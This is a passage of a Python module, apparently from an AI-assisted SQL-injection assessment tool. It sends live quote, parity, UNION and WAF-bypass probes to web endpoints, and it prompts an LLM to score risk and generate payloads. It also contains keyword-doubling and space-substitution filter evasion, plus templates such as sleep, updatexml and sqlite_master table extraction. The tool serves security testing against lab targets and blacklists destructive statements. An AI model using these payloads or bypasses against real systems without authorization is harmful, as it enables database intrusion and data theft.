# -*- coding: utf-8 -*-
"""AI 引擎：OpenAI 兼容接口 + 无 key 规则引擎降级。

职责：
  1. 接口风险研判（风险分 + 置信度 + 理由）——前置误报库负样本检索
  2. Payload 构造（针对 WAF 画像自适应绕过）——强制过安全过滤器
  3. 绕过策略生成
安全约束：
  - AI 输出必须过 JSON 校验，解析失败直接走规则引擎，绝不"自由发挥"
  - 生成的 payload 逐条过破坏性语句黑名单（写接口保护）
  - 未配置 API key 时自动降级为规则引擎，系统全程可跑（MVP 保证）
"""
import json
import re
import threading
import time

import httpx
from sqlalchemy.orm import Session

from app.core import config
from app.core.security import decrypt_value, encrypt_value, is_destructive_payload
from app.models.assessment import RiskAssessment
from app.models.endpoint import Endpoint
from app.models.system import Setting
from app.services import knowledge
from app.services.event_bus import bus

# ============ 设置读写（含加密） ============

def get_setting(db: Session, key: str, decrypt: bool = False) -> str:
    row = db.query(Setting).filter(Setting.key == key).first()
    if not row or row.value is None:
        return ""
    return decrypt_value(row.value) if (decrypt and row.is_secret) else row.value


def set_setting(db: Session, key: str, value: str, *, is_secret: bool = False,
                updated_by: int | None = None):
    row = db.query(Setting).filter(Setting.key == key).first()
    stored = encrypt_value(value) if is_secret else value
    if row:
        row.value = stored
        row.is_secret = 1 if is_secret else 0
        row.updated_by = updated_by
    else:
        db.add(Setting(key=key, value=stored, is_secret=1 if is_secret else 0, updated_by=updated_by))
    db.commit()


def ai_configured(db: Session) -> bool:
    return bool(get_setting(db, Setting.KEY_AI_BASE_URL, decrypt=False)
                and get_setting(db, Setting.KEY_AI_API_KEY, decrypt=True)
                and get_setting(db, Setting.KEY_AI_MODEL, decrypt=False))


# ============ AI 调用熔断（P2，2026-10-15）============
# DeepSeek "接受后挂起"时，httpx 单浮点超时**不生效**（实测 181s 才返回 None），
# 逐接口研判会各白等数分钟 → 整条流水线拖死（smoke_1 实测 >180s 顶穿预算）。
# 对策：① 显式分段超时（connect/read/write/pool 各自独立）；
#       ② 连续失败 N 次 → 熔断冷却，期间直接降级规则引擎，不再干等。
_BREAKER_LOCK = threading.Lock()
_BREAKER = {"fails": 0, "until": 0.0}
_AI_FAIL_THRESHOLD = 3          # 连续失败次数
_AI_COOLDOWN_S = 300.0          # 熔断冷却时长


def _ai_breaker_open() -> bool:
    with _BREAKER_LOCK:
        return time.time() < _BREAKER["until"]


def _ai_breaker_note(ok: bool):
    with _BREAKER_LOCK:
        if ok:
            _BREAKER["fails"] = 0
            _BREAKER["until"] = 0.0
            return
        _BREAKER["fails"] += 1
        if _BREAKER["fails"] >= _AI_FAIL_THRESHOLD:
            _BREAKER["until"] = time.time() + _AI_COOLDOWN_S
            _BREAKER["fails"] = 0


def _ai_breaker_reset():
    """测试/恢复用：清零熔断状态。"""
    with _BREAKER_LOCK:
        _BREAKER["fails"] = 0
        _BREAKER["until"] = 0.0


# ============ OpenAI 兼容客户端 ============

class AIClient:
    def __init__(self, base_url: str, api_key: str, model: str, timeout: float = 60.0):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.model = model
        # 显式分段超时：单浮点 timeout 在"接受后挂起"场景下被证明拦不住。
        self.timeout = httpx.Timeout(connect=5.0, read=timeout, write=10.0, pool=5.0)
        self.tokens_used = 0

    def chat_json(self, system: str, user: str) -> dict | None:
        """调用 chat/completions，要求 JSON 输出；失败返回 None（调用方降级）。"""
        if _ai_breaker_open():
            bus.publish("ai", "AI 服务近期连续失败，熔断中——本轮直接降级规则引擎",
                        level="warn")
            return None
        try:
            payload = {
                "model": self.model,
                "messages": [{"role": "system", "content": system},
                             {"role": "user", "content": user}],
            }
            # 推理型模型（deepseek-reasoner 等）不支持 temperature，传了会被拒；
            # 只对普通对话模型下发采样参数。
            if "reasoner" not in (self.model or "").lower():
                payload["temperature"] = 0.2
            resp = httpx.post(
                f"{self.base_url}/chat/completions",
                headers={"Authorization": f"Bearer {self.api_key}",
                         "Content-Type": "application/json"},
                json=payload,
                timeout=self.timeout,
                trust_env=False,   # 不走系统代理：Windows 注册表代理关闭时会 10061 拒连
            )
            resp.raise_for_status()
            data = resp.json()
            self.tokens_used += data.get("usage", {}).get("total_tokens", 0)
            content = data["choices"][0]["message"]["content"]
            # 剥掉 markdown 代码块围栏
            content = re.sub(r"^```(?:json)?\s*|\s*```$", "", content.strip())
            out = json.loads(content)
            _ai_breaker_note(True)
            return out
        except Exception as exc:
            _ai_breaker_note(False)
            bus.publish("ai", f"AI 调用失败，降级规则引擎：{exc}", level="warn")
            return None


def get_ai_client(db: Session) -> AIClient | None:
    if not ai_configured(db):
        return None
    return AIClient(
        base_url=get_setting(db, Setting.KEY_AI_BASE_URL),
        api_key=get_setting(db, Setting.KEY_AI_API_KEY, decrypt=True),
        model=get_setting(db, Setting.KEY_AI_MODEL),
    )


# ============ 1. 风险研判 ============

_RISK_SYSTEM = """你是Web安全风险研判引擎。根据"真实探针响应"判断是否像 SQL 注入。
只输出JSON：{"risk_score":0-100,"confidence":0-1,"reasons":["..."],"likely_dbms":"sqlite|mysql|postgresql|mssql|unknown","injection_hint":"char_single|char_double|numeric|order_by|unknown"}
硬规则：
1) 若 probe_quote 出现数据库语法错误/SQL片段回显（如 unrecognized token、SQL syntax、LIKE '%..'%），风险分应≥75，confidence≥0.8
2) 若只是业务 404/空结果且无 SQL 特征，不要高分
3) 不要只靠参数名猜测；优先看 probes 证据
4) 有 known_false_positives 命中时显著降分
5) 若 probes 里 error_kind=non_injection（must be an integer / java.lang. / JSON 解析错），
   是应用层报错、数据库没见过畸形语句 → 判非注入，风险分≤40
6) probes 里 label=parity（单引号报错、双单引号不报错）是字符串型注入最强证据 → 风险分≥85
7) 若 probe_paren_dquote（payload 形如 `1")`）或 probe_paren_quote（`1')`）出现数据库语法错误、
   而裸引号档无任何差异 —— 说明注入语境是「引号+闭括号」→ 风险分≥85，
   injection_hint 用 char_double（`")` 语境）或 char_single（`')` 语境）。
   注意：这种情形下裸引号档**本来就该没差异**（被当成字符串内容），不要因为裸引号无差异就降分。
不要输出其他文字。"""


# 正向特征：数据库侧语法/SQL 片段回显，命中才算"疑似注入"
# 注意：
#  · 不收 "like '%" —— 回显型靶机（16328/demo 都会把拼接后的 SQL 打回页面）
#    页面里天然含 `LIKE '%..%'`，会被当成报错 → 一切正常页都误判为 SQL 错误。
#  · 裸 DBMS 名（sqlite/mysql/postgres/psql）单独出现不算报错：回显型靶点会把
#    我们发出的 `sqlite_version()` / `information_schema` 原样打回页面，裸词
#    必然命中 → 成功回显被误判为报错（2026-10-23 smoke_5 实测：DBMS 判定恒失败，
#    整段 SQLite 剧本被跳过）。这些词只在伴有错误语境时才计入。
_SQL_ERROR_MARKERS = (
    "unrecognized token", "sql syntax", "sqlite", "mysql", "postgres", "psql",
    "ora-", "odbc", "syntax error", "near \"", "查询异常", "sql logic error",
    "you have an error in your sql", "quoted string", "unclosed quotation",
    "sqlstate", "jdbc", "prepared statement",
)
_DBMS_NAME_MARKERS = ("sqlite", "mysql", "postgres", "psql")
_ERROR_CONTEXT_MARKERS = (
    "error", "exception", "syntax", "unrecognized", "warning", "fatal",
    "denied", "no such", "failed", "invalid", "deny",
)

# 负向特征（优先级高于正向）：应用层报错，数据库压根没见到畸形语句。
# 依据《SQL注入快速判断》：加引号后 500 报错可能是 JSON 结构错或强类型约束
# （must be an integer / java.lang.Integer），判为"假注入"，避免误触 auto_pass。
_NON_INJECTION_MARKERS = (
    "must be an integer", "invalid input syntax for integer", "java.lang.",
    "cannot be cast", "numberformatexception", "classcastexception",
    "json parse", "json.decoder", "expecting value", "unexpected token",
    "not a valid json", "failed to parse", "is not valid json",
)


def classify_db_error(text: str) -> tuple[str | None, str | None]:
    """判断响应文本是否含数据库报错。

    返回 (命中的正向特征, 命中的负向特征)，两者至多一个非空。
    **负向优先**：命中负向即认为这是应用层报错（类型转换/JSON 解析），非注入。
    """
    low = (text or "").lower()
    for m in _NON_INJECTION_MARKERS:
        if m in low:
            return None, m
    for m in _SQL_ERROR_MARKERS:
        if m not in low:
            continue
        # 裸 DBMS 名必须伴随错误语境才计入（回显型靶点会原样打回我们的 payload）
        if m in _DBMS_NAME_MARKERS and not any(c in low for c in _ERROR_CONTEXT_MARKERS):
            continue
        return m, None
    return None, None


def _collect_sqli_probes(endpoint: Endpoint) -> list[dict]:
    """轻量真请求：基线 vs 单引号，给研判看证据（最多 3 个参数）。

    注意：这里走裸 httpx（probe 时还没有 SafeHttpClient 上下文），因此自带 0.3s 节流，
    避免与限速模块的设计冲突。
    """
    import time as _time
    import httpx
    params = [p for p in (endpoint.params or []) if p.get("name")]
    if not params:
        return []
    path = (endpoint.raw_path or endpoint.path or "/").split("?")[0]
    url = f"http://{endpoint.host}{path}"
    out = []
    client = httpx.Client(timeout=12.0, follow_redirects=True, verify=False,
                          trust_env=False)   # 探针不走系统代理（实测会 30s 超时）
    try:
        for p in params[:3]:        # 2026-10-15 追加轮：[:2]→[:3]，第 3 个参数此前零证据
            name = p["name"]
            base = (p.get("sample_value") or "1")
            # 五档：baseline / 单引号 / 双单引号 / bypass 成对档。
            # quote 报错而 dquote 不报错 = 引号奇偶法命中，字符串型注入的强证据
            # （依据《SQL注入快速判断》：奇数报错、偶数不报错）。
            # bypass 成对档（2026-10-15 50590 实测补）：过滤空格/单次关键字的 WAF 会把
            # 教科书三档整个静默吃掉 → 研判必瞎；`//` 代空格形态已在 16328/47887
            # 真机验证可穿透，true/false 同构对照给 AI 布尔差异证据。
            # 2026-10-15 补「引号+闭括号」两档：sqli-labs Less-12 这类靶点的 SQL 是
            # `WHERE col=("$v")` —— 裸引号 `1'` 进 SQL 后是 `("1'")`，被 MySQL 当成
            # **合法字符串** `1'`，查询照常执行、无报错 → 研判阶段对这类语境**必瞎**
            # （实测 Less-12 五档探针响应长度全等 1452）。必须补 `1')` / `1")`。
            for label, val in (("baseline", str(base)), ("quote", f"{base}'"),
                               ("dquote", f"{base}''"),
                               ("paren_quote", f"{base}')"),
                               ("paren_dquote", f'{base}")'),
                               ("bypass_true", f"{base}'//and//'1'='1"),
                               ("bypass_false", f"{base}'//and//'1'='2"),
                               # OR/AND 只被删一次、空格不禁：双写保留空格（19330）
                               ("orand_true", f"{base}' OORR '1'='1"),
                               ("orand_false", f"{base}' OORR '1'='2")):
                try:
                    if endpoint.method.upper() == "POST" and p.get("location") == "body":
                        data = {x["name"]: (x.get("sample_value") or "") for x in params
                                if x.get("location") == "body"}
                        data[name] = val
                        resp = client.post(url, data=data)
                    else:
                        q = {x["name"]: ("" if x["name"] != name else val)
                             for x in params if x.get("location") in (None, "query")}
                        if name not in q:
                            q[name] = val
                        resp = client.get(url, params=q)
                    text = resp.text or ""
                    pos, neg = classify_db_error(text)
                    # 截一段错误/SQL。SELECT 后必须跟空白且不能是 {——
                    # 50590 实测页面 CSS `.select{...}` 曾被 `SELECT[^<\n]{0,160}` 误匹配，
                    # 把无害 CSS 塞进 snippet 干扰研判
                    snip = ""
                    for pat in (r"查询异常:[^<\n]{0,160}", r"\bSELECT\s+(?!\{)[^\n<]{0,160}",
                                r"unrecognized token[^<\n]{0,120}", r"SQL logic[^<\n]{0,120}",
                                r"(?:must be an integer|invalid input syntax[^<\n]{0,80})"):
                        m = re.search(pat, text, re.I)
                        if m:
                            snip = m.group(0)[:180]
                            break
                    out.append({
                        "param": name, "label": label, "status": resp.status_code,
                        "length": len(resp.content), "sql_error_like": bool(pos),
                        "error_kind": "sql" if pos else ("non_injection" if neg else None),
                        "matched": pos or neg,
                        "snippet": snip,
                    })
                except Exception as exc:
                    out.append({"param": name, "label": label, "error": str(exc)[:120]})
                _time.sleep(0.3)            # 探针节流：裸连请求之间留间隔

            # UNION 回显探针：用唯一 marker 探测列数。
            # 搜索框这类 POST 参数常见 UNION 回显；慢目标上 sqlmap 可能先耗死在布尔测试，
            # 在研判阶段直接拿到 marker 回显能显著提高检出率。
            #
            # marker 在 payload 里必须**以表达式形式出现**（'mhszed'||'0'），
            # 不能写成字面量 'mhszed0'：否则回显型普通页面会把输入原样反射回来，
            # 造成 UNION 假阳性（良性靶场测试已覆盖）。
            union_found = False
            for style in ("pipe", "concat"):
                for ncols in range(1, 9):
                    markers = [f"mhszed{i}" for i in range(ncols)]
                    if style == "pipe":
                        exprs = [f"'mhszed'||'{i}'" for i in range(ncols)]
                    else:
                        exprs = [f"CONCAT('mhszed','{i}')" for i in range(ncols)]
                    val = f"{base}' UNION SELECT " + ",".join(exprs) + "-- -"
                    try:
                        if endpoint.method.upper() == "POST" and p.get("location") == "body":
                            data = {x["name"]: (x.get("sample_value") or "") for x in params
                                    if x.get("location") == "body"}
                            data[name] = val
                            resp = client.post(url, data=data)
                        else:
                            q = {x["name"]: ("" if x["name"] != name else val)
                                 for x in params if x.get("location") in (None, "query")}
                            if name not in q:
                                q[name] = val
                            resp = client.get(url, params=q)
                        text = resp.text or ""
                        if resp.status_code == 200 and all(m in text for m in markers):
                            out.append({
                                "param": name, "label": "union_echo",
                                "status": resp.status_code, "length": len(resp.content),
                                "sql_error_like": False, "matched": "union_echo",
                                "payload": val, "columns": ncols,
                                "snippet": text[:160],
                            })
                            union_found = True
                            break
                    except Exception as exc:
                        out.append({"param": name, "label": "union_echo",
                                    "error": str(exc)[:120]})
                        break
                    _time.sleep(0.3)
                if union_found:
                    break

        # 引号奇偶法：同参数下 quote 报错而 dquote 不报错（或反之）→ 引号数量控制了解析
        for name in {p["name"] for p in params[:3]}:
            by = {r["label"]: r for r in out if r.get("param") == name}
            q, d = by.get("quote", {}), by.get("dquote", {})
            if q.get("sql_error_like") and d.get("status") and not d.get("sql_error_like"):
                out.append({"param": name, "label": "parity", "sql_error_like": True,
                            "error_kind": "sql", "matched": "quote_parity",
                            "snippet": "引号奇偶法：单引号报错、双单引号不报错 → 字符串型注入强证据"})

        # bypass 成对档的衍生证据（过滤型目标的研判线索，50590 补）：
        # ① bypass 变体触发 SQL 报错而普通引号静默 → payload 被过滤且语句能进数据库
        # ② bypass true/false 响应显著不同 → 过滤型布尔差异
        for name in {p["name"] for p in params[:3]}:
            by = {r["label"]: r for r in out if r.get("param") == name}
            bt, bf = by.get("bypass_true", {}), by.get("bypass_false", {})
            if bt.get("sql_error_like") and not by.get("quote", {}).get("sql_error_like"):
                out.append({"param": name, "label": "bypass_reveal", "sql_error_like": True,
                            "error_kind": "sql", "matched": "bypass_error",
                            "snippet": f"普通引号形态被静默过滤，绕过变体触发SQL报错："
                                       f"{(bt.get('snippet') or '')[:120]}"})
            elif ("error" not in bt and "error" not in bf
                  and bt.get("status") and bf.get("status")
                  and (bt["status"] != bf["status"]
                       or abs((bt.get("length") or 0) - (bf.get("length") or 0)) > 80)):
                out.append({"param": name, "label": "bypass_diff",
                            "sql_error_like": False, "matched": "bypass_bool_diff",
                            "snippet": "绕过形态 true/false 响应显著不同（布尔差异），"
                                       "过滤型注入强证据（普通形态全被吃掉）"})
    finally:
        client.close()
    return out


def assess_endpoint(db: Session, endpoint: Endpoint, waf_profile=None) -> RiskAssessment:
    """研判：负样本检索 → 轻量探针证据 → AI/规则 → 路由。"""
    negatives = knowledge.match_false_positives(db, endpoint)
    neg_hit_ids = [n.id for n in negatives]
    probes = _collect_sqli_probes(endpoint)

    client = get_ai_client(db)
    result = None
    if client is not None:
        prompt = _build_assess_prompt(endpoint, waf_profile, negatives, db=db, probes=probes)
        result = client.chat_json(_RISK_SYSTEM, prompt)

    if result is None or not _valid_assessment(result):
        result = _rule_based_assessment(endpoint, negatives, probes=probes)

    risk = float(result["risk_score"])
    conf = float(result["confidence"])
    # 强探针证据：SQL 报错回显 / 引号奇偶 / 绕过形态揭示（50590 补：
    # 过滤型目标普通三档全静默，bypass 成对档才是唯一能看见的窗口）
    probe_strong = any(p.get("sql_error_like")
                       or p.get("matched") in ("quote_parity", "bypass_error",
                                               "bypass_bool_diff", "union_echo")
                       for p in probes)
    # 探针已见 SQL 报错：保底抬分，避免 AI 瞎压
    # floor 必须高于 AI_CONFIDENCE_AUTO(0.9)，否则永远停在 manual_review 到不了 auto_pass
    if probe_strong:
        risk = max(risk, 85.0)
        conf = max(conf, 0.95)
    if neg_hit_ids:
        risk = min(risk, 30.0)
        conf = min(conf, 0.5)
    # 探针只见应用层报错（类型转换 / JSON 解析错）→ 参数已被强类型保护，
    # 数据库没见过畸形语句，判非注入并降分（依据《SQL注入快速判断》）
    noninj = [p for p in probes if p.get("error_kind") == "non_injection"]
    if noninj and not probe_strong:
        risk = min(risk, 40.0)
        conf = min(conf, 0.6)
    # 探针请求全部失败（连接拒绝/重置等）→ 目标不可达、零证据：
    # AI 此时给出的任何置信度都无意义（"确信无漏洞"型高置信度会误触 auto_pass），
    # 强制降级到 suspicious 以下，人工核查目标可达性后再重判
    probes_dead = bool(probes) and all("error" in p for p in probes)
    if probes_dead:
        conf = min(conf, 0.5)

    route = ("auto_pass" if conf >= config.AI_CONFIDENCE_AUTO
             else "manual_review" if conf >= config.AI_CONFIDENCE_MANUAL
             else "suspicious")

    reasons = list(result.get("reasons", []))
    if probes_dead:
        reasons.insert(0, "探针请求全部失败（目标不可达），置信度已强制降级，请核查目标可达性后重判")
    if probe_strong:
        if any(p.get("matched") == "quote_parity" for p in probes):
            reasons.insert(0, "引号奇偶法命中：单引号报错、双单引号不报错，字符串型注入强证据")
        if any(p.get("matched") == "bypass_error" for p in probes):
            reasons.insert(0, "绕过形态揭示：普通引号被静默过滤，// 形态触发 SQL 报错——过滤型注入强证据")
        if any(p.get("matched") == "bypass_bool_diff" for p in probes):
            reasons.insert(0, "绕过形态 true/false 响应显著不同（布尔差异）——过滤型注入强证据")
        reasons.insert(0, "探针出现数据库语法错误/SQL回显/注入强证据，高度疑似注入")
    if noninj and not probe_strong:
        reasons.insert(0, f"探针仅见应用层报错（{noninj[0].get('matched')}），"
                          "疑似强类型约束/JSON解析错，判非注入")
    if result.get("likely_dbms"):
        reasons.append(f"likely_dbms={result.get('likely_dbms')}")
    if result.get("injection_hint"):
        reasons.append(f"injection_hint={result.get('injection_hint')}")
    if neg_hit_ids:
        reasons.append(f"命中误报样本库 #{','.join(map(str, neg_hit_ids))}，风险与置信度已压制")

    row = RiskAssessment(
        task_id=endpoint.task_id, endpoint_id=endpoint.id,
        risk_score=str(risk), confidence=str(round(conf, 3)), route=route,
        reasons=reasons or None,
        # 探针落库上限：7 档 × 最多 3 参数 = 21（旧的 8 会把第 2/3 参数的证据整段切掉）。
        # 注意：喂给 LLM 的 prompt 用完整 probes（_build_assess_prompt 不截断），这里只影响留痕。
        model_info=({"provider": "openai-compatible", "model": client.model,
                     "tokens": client.tokens_used, "probes": probes[:21]} if client
                    else {"provider": "rule-engine", "model": "builtin-heuristic", "probes": probes[:21]}),
        kb_negatives_hit=neg_hit_ids or None,
    )
    db.add(row)
    db.commit()
    bus.publish("ai", f"研判 {endpoint.method} {endpoint.path}：风险 {risk:.0f} / 置信 {conf:.2f}"
                      f" → {route}", task_id=endpoint.task_id)
    return row


def latest_risk(db: Session, endpoint_id: int) -> float:
    """接口最新一次研判的风险分（无记录返回 0）。"""
    row = (db.query(RiskAssessment).filter(RiskAssessment.endpoint_id == endpoint_id)
           .order_by(RiskAssessment.id.desc()).first())
    try:
        return float(row.risk_score) if row else 0.0
    except (TypeError, ValueError):
        return 0.0


def latest_likely_dbms(db: Session, endpoint_id: int) -> str:
    """接口最新研判推断的 DBMS：优先 reasons 里的 likely_dbms= 标记，回退探针 snippet。"""
    row = (db.query(RiskAssessment).filter(RiskAssessment.endpoint_id == endpoint_id)
           .order_by(RiskAssessment.id.desc()).first())
    if not row:
        return "unknown"
    for r in (row.reasons or []):
        m = re.match(r"likely_dbms=(\w+)", str(r))
        if m:
            return m.group(1).lower()
    blob = " ".join(str(p.get("snippet") or "")
                   for p in (row.model_info or {}).get("probes", [])).lower()
    if "sqlite" in blob or "unrecognized token" in blob:
        return "sqlite"
    if "postgres" in blob or "psql" in blob:
        return "postgresql"
    if "mysql" in blob:
        return "mysql"
    return "unknown"


def _build_assess_prompt(endpoint: Endpoint, waf_profile, negatives, db: Session | None = None,
                         probes: list | None = None) -> str:
    info = {
        "method": endpoint.method, "path": endpoint.path,
        "params": endpoint.params, "read_write": endpoint.read_write,
        "chain_inferred": bool(endpoint.chain_inferred),
        "probes": probes or [],
    }
    if waf_profile is not None:
        info["waf"] = {"has": bool(waf_profile.has_waf), "product": waf_profile.product}
    if negatives:
        info["known_false_positives"] = [
            {"endpoint_match": True, "reason": n.reason[:80]} for n in negatives]
    if db is not None:
        keys = [endpoint.path or "", endpoint.method or ""]
        for p in (endpoint.params or []):
            if p.get("name"):
                keys.append(str(p["name"]))
        keys += ["sqlite", "union", "注入", "postgresql", "mysql", "盲注", "报错"]
        insights = knowledge.search_insights(db, keywords=keys, limit=5)
        if insights:
            info["learned_insights"] = [
                {"kind": i.kind, "title": i.title, "body": i.body[:240],
                 "payload": (i.example_payload or "")[:160], "tags": i.tags}
                for i in insights
            ]
    return json.dumps(info, ensure_ascii=False)

def _valid_assessment(d: dict) -> bool:
    try:
        return (isinstance(d.get("risk_score"), (int, float)) and 0 <= d["risk_score"] <= 100
                and isinstance(d.get("confidence"), (int, float)) and 0 <= d["confidence"] <= 1)
    except Exception:
        return False


def _rule_based_assessment(endpoint: Endpoint, negatives, probes: list | None = None) -> dict:
    """无 AI 时的启发式：优先看探针 SQL 报错，其次参数名。"""
    score, reasons = 10.0, []
    params = endpoint.params or []
    names = [p["name"].lower() for p in params]
    likely_dbms, injection_hint = "unknown", "unknown"

    if any(p.get("sql_error_like") for p in (probes or [])):
        score = 85
        reasons.append("探针出现数据库语法错误/SQL回显")
        blob = " ".join((p.get("snippet") or "") for p in probes or []).lower()
        if "sqlite" in blob or "unrecognized token" in blob:
            likely_dbms = "sqlite"
        elif "mysql" in blob:
            likely_dbms = "mysql"
        elif "postgres" in blob or "psql" in blob:
            likely_dbms = "postgresql"
        injection_hint = "char_single"
    else:
        if params:
            score += 20
            reasons.append(f"带 {len(params)} 个参数")
        id_like = [n for n in names if n in ("id", "uid", "cid", "itemid", "item_id", "nid", "sid",
                                              "sort", "order", "page", "type", "cat")]
        if id_like:
            score += 25
            reasons.append(f"疑似拼接参数: {','.join(id_like)}")
        search_like = [n for n in names if n in ("q", "kw", "keyword", "search", "name", "filter")]
        if search_like:
            score += 15
            reasons.append(f"搜索/过滤参数: {','.join(search_like)}")
        if endpoint.read_write == "write":
            score += 10
            reasons.append("写接口")
        if endpoint.chain_inferred:
            score += 5
            reasons.append("推断链路成员")
    if negatives:
        score -= 20
        reasons.append("命中误报样本库，下调")

    conf = 0.95 if score < 40 else (0.85 if score >= 75 else (0.65 if score >= 50 else 0.8))
    return {"risk_score": max(0, min(100, score)), "confidence": conf, "reasons": reasons,
            "likely_dbms": likely_dbms, "injection_hint": injection_hint}


# ============ 1.5 绕过变体（靶机 WAF：过滤空格 + 单次关键字） ============

# 空格替代序列：靶机实测 // 有效；%0a/%09 备选；/**/ 因 /* 被拦放最后
_SPACE_ALT = ("//", "%0a", "%09", "/**/")
# 被 WAF 单次过滤的 SQL 关键字 → 双写绕过（union→uunionnion / select→sselectelect）
_DBL_KEYWORDS = ("union", "select", "from", "where", "order", "by", "and", "or", "limit")


def double_write(word: str) -> str:
    """关键字双写：W → W[:1] + W + W[1:]。WAF 剥掉第一处 W 后仍留下完整的 W。"""
    return word[:1] + word + word[1:]


# 实测被 WAF **单次过滤**的关键字：含这些时双写优先，否则双写会把没被过滤的词写坏
_FILTERED_KW = ("union", "select", "from", "where")


def bypass_variants(payload: str) -> list[str]:
    """针对"过滤空格 + 单次关键字过滤"的 WAF 生成绕过变体。

    两类形态：
      · 纯空格替代：`ORDER BY` → `//ORDER//BY`（靶机实测关键字本身没被过滤）
      · 空格替代 + 关键字双写：`union select` → `//uunionnion//sselectelect`
    顺序按 payload 内容决定——含 union/select/from/where 时双写优先（否则先试的
    纯空格版会被过滤掉、白费请求）；不含时纯空格优先（双写反而破坏关键字）。
    """
    plain: list[str] = []
    for sp in _SPACE_ALT:
        v = payload.replace(" ", sp)
        if v != payload:
            plain.append(v)
    low = payload.lower()
    has_orand = bool(re.search(r"\b(and|or)\b", low))
    dbl: list[str] = []
    # 只双写关键字、**保留原空格**：针对"只删 and/or、不禁空格"的黑名单
    # （19330 实测：`1' OORR 1=1--` 生效；把空格换成 `//` 反而把 SQL 弄坏）。
    keep = payload
    for kw in _DBL_KEYWORDS:
        keep = re.sub(rf"\b{kw}\b", lambda m: double_write(m.group(0)), keep, flags=re.I)
    if keep != payload:
        (dbl.insert(0, keep) if has_orand else dbl.append(keep))
    # 双写空格替代：`//`、`%0a`、`/**/` 各做一版。
    # 49920 实测：该 WAF 禁止空白 + 删除一次 select/from，正确形态是
    # `/**/` 代空格 + `SELSELECTECT`/`FRFROMOM` 双写——旧实现只覆盖前两种，漏掉它。
    for sp in ("//", "%0a", "/**/"):
        v = payload.replace(" ", sp)
        for kw in _DBL_KEYWORDS:
            v = re.sub(rf"\b{kw}\b", lambda m: double_write(m.group(0)), v, flags=re.I)
        dbl.append(v)

    # 等价类引擎：运算符（&&/||）、注释切分（A/**/ND）、版本注释（/*!50000AND*/）。
    # 纯生成、不发请求；只在「常规 payload 全无反应」的重试路径里被取用。
    from app.services.payload_grammar import bypass_matrix
    _gram = bypass_matrix(payload, limit=8)
    if _gram:
        dbl = (_gram + dbl) if has_orand else (dbl + _gram)

    ordered = (dbl + plain) if (has_orand or any(
        re.search(rf"\b{k}\b", low) for k in _FILTERED_KW)) else (plain + dbl)
    seen: set[str] = set()
    out: list[str] = []
    for v in ordered:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


# ============ 2. Payload 构造 ============

_PAYLOAD_SYSTEM = """你是SQL注入Payload构造引擎。请"模仿"当前接口的注入语境生成新payload，不要死记硬背固定模板。
只输出JSON：
{"payloads":[{"payload":"参数值","vector":"boolean|time|error|union","false_variant":"布尔向量必填：与payload同型但条件为假","expected_criteria":"判据"}]}
要求：
1) 先看 probe_evidence / likely_dbms，推断参数被拼进了什么上下文：单引号后立刻报错 → 参数在引号内（如 LIKE '%..%' 或 ='...'），payload 必须先闭合引号再用 -- 注释掉尾部残余（-- 后留一个空格）
   闭合方式二选一：and 闭合（' and '1'='1）或注释闭合。注释符：MySQL 用 # 或 --+，
   但 GET 请求里 # 必须写成 %23、--+ 的 + 会被解成空格，否则注释失效、整条 payload 作废
   probe_evidence 里若 quote 报错而 dquote 不报错（引号奇偶法），说明参数确在引号内且单引号可控
2) 布尔向量必须成对生成：payload 为永真（如 '1'='1'），false_variant 为同型永假（如 '1'='2'），两者除真假条件外逐字符同构，否则对照无意义
3) SQLite：可用 || 拼接、sqlite_version()、sqlite_master；注释用 -- ；没有 sleep()
4) PostgreSQL：可用 ::text、UNION ALL
5) MySQL：可用 updatexml/sleep 等（无破坏性语句）
6) union 向量：按 probe_evidence 猜列数，全部列填同版本函数（如 sqlite_version()），列数不匹配的报错本身也是证据
7) payload 只是单参数值；最多 5 条；严禁 drop/delete/truncate/update/insert/alter/os-shell
8) 参考 kb_success_samples 的思路与风格做变形，不要原样照抄一条就结束
9) waf 存在或 payload 被静默过滤（发出无任何效果）时，优先等价变形：空格→//（备选 %0a/%09）、
   关键字双写（union→uunionnion、select→sselectelect、from→ffromrom、where→wwherehere）
10) SQLite 取库表：`-1' union select 1,group_concat(name),3,4 from sqlite_master-- `（先枚举表名，
   再对目标表 group_concat 字段）。注意列数要与 order by 判定一致，否则报错本身也是线索
不要输出其他文字。"""

# 内置模板（无 AI 降级用）：每条 = (模板, 向量, 预期判据, false变体|None)
# 布尔模板必须以 -- 收尾：报错型接口通常把参数拼进 LIKE '%..%' 等引号上下文，
# 不注释尾部残余时 '1'='1%' 之类恒为假，true 变体实际算出 false。
_BUILTIN_TEMPLATES = [
    # ---- 引号型（字符串注入语境）----
    ("{v}' and '1'='1' -- ", "boolean",
     "true 注入响应应≈基线，false 注入应显著不同", "{v}' and '1'='2' -- "),
    ("{v}' and sleep({t})-- ", "time", "响应时间应显著大于基线（>= {t}s）", None),
    ("{v}' and updatexml(1,concat(0x7e,version()),1)-- ", "error",
     "响应应含数据库报错回显", None),
    # ---- 数字型（`WHERE id=1` 这类无引号语境）----
    # 2026-10-15 追加轮补：此前模板**全是引号型**，规则引擎降级模式对
    # `id=1 and 1=1` 这类纯数字注入零覆盖 → 结构性漏检。
    ("{v} and 1=1", "boolean",
     "数字型：true 注入响应应≈基线，false 注入应显著不同", "{v} and 1=2"),
    ("{v} and sleep({t})", "time", "数字型：响应时间应显著大于基线（>= {t}s）", None),
]

_BUILTIN_SQLITE = [
    ("{v}'", "error", "应出现 sqlite/unrecognized token/SQL 回显", None),
    ("{v}' and '1'='1' -- ", "boolean",
     "true 注入响应应≈基线，false 注入应显著不同", "{v}' and '1'='2' -- "),
    ("{v}'||'x", "error", "拼接破坏 LIKE 引号，应报错或异常", None),
    # 数字型成对（2026-10-15 追加轮补）：SQLite 无 sleep()，只补布尔成对档
    ("{v} and 1=1", "boolean",
     "数字型：true 注入响应应≈基线，false 注入应显著不同", "{v} and 1=2"),
    ("' union select sqlite_version(),sqlite_version(),sqlite_version()-- ", "union",
     "列数匹配时回显版本号；列数不匹配的报错本身也是注入证据", None),
    # 取库表：UNION 回显 sqlite_master 的表名（回显里会出现 CREATE TABLE 片段）
    ("-1' union select 1,group_concat(name),3,4 from sqlite_master-- ", "union",
     "回显 sqlite_master 表名（响应出现 CREATE TABLE / 表名列表）", None),
]


# 时间盲注确定性成对模板（(真值, 假值)）——**不依赖 AI 生成**。
# 2026-10-23 某靶场 实测：纯时间盲注靶（响应恒为同一 JSON、无报错/长度差）上，
